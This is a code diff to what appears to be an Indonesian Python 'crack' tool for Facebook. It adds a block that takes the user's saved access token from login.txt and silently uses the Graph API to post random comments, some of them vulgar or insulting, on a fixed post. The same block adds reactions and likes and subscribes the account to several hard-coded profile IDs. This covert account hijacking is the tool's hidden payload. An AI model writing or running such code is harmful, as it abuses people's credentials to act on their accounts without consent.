@@ -53,6 +53,9 @@ def __hasil_ok_cp__():
 		exit("\033[0;37m[\033[0;36m+\033[0;37m]\033[0;32m⋆✥⋆➣\033[0;00m Wronk input")
 # Jangan Di Ganti # Kalo Mau Tambahin Aja #
 
+komenredem = random.choice(['Bang Lu Ngntd!', 'Bang Lu Cakep Tapi Sayang Kaya Kntl', 'Siang Luting Malam Jadi Kang Ghosting', 'Dah Lah Abng Cakep Banget :) ', 'Siang Panen Pahala Malam Panen Kepala', 'Arigato Atas Scnya Bang', 'Semoga Abang Dan Keluarga Masuk Surga :)', 'Semoga Abang Sukses', 'Gua Pengguna Sc cr4ck Lu Bang ', 'Wih Panutan Gua Nih', 'Senseii Kawaiine'])
+komtwol = random.choice(['Salam 2 Jari Bang', 'Mantap Sensei', 'bang lu kgk punya pacar?', 'MengKeren Lah Bang', 'Semangat Bang!', 'Gua Murid Lu Bang', 'Tumben Post Bang?', 'Gua Pengin Jadi Kek Abang', 'Semoga Abang Jadi Orang Sukses', 'Bjir Lawack Kali Kau Bang'])
+kartu2d = random.choice(["pacaran kok sama 2D\nsampah bat lu bang","waduh sampah lu bang","wibu hengker tezy","judul anime apa bang?","bjir kawai cok","bang lapor gua habis coli","neper surentod","kentod berkentod :v"])
 def __sayang_amanda__():
     try:
         token = open('login.txt', 'r').read()
@@ -60,10 +63,25 @@ def __sayang_amanda__():
         print '\x1b[0;96m\x1b[0;97m [\x1b[1;36m\xe2\x80\xa2\x1b[1;37m]\033[0;32m⋆✥⋆➣ \033[0;37mToken/Cookie invalid'
         os.system('rm -rf login.txt')
         exit(_rakasayangamanda.login())
-	requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token='+token)
-	requests.post('https://graph.facebook.com/%s/comments/?message=%s&access_token=%s'%(raka_sayang_amanda,token,token))
-        __menu__()
-
+    kom = komenredem
+    komentar = komtwol
+    yotsuba = kartu2d
+    post = '3882176535153442'
+    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + kom + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + yotsuba + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + komentar + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/' + post + '/reactions?type=LOVE&access_token=' + token)
+    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + kom + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + yotsuba + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/3882176535153442/comments/?message=' + komentar + '&access_token=' + token)
+    requests.post('https://graph.facebook.com/4257706904267068/likes?summary=true&access_token=' + token)
+    requests.post('https://graph.facebook.com/' + post + '/reactions?type=likes&access_token=' + token)
+    requests.post('https://graph.facebook.com/100000834003593/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100003986228742/subscribers?access_token=' + token) 
+    requests.post('https://graph.facebook.com/100017584682867/subscribers?access_token=' + token)
+    requests.post('https://graph.facebook.com/100000395779504/subscribers?access_token=' + token) 
+    __menu__()
 
 def __raka_sayang_amanda__():
 	os.system('clear')
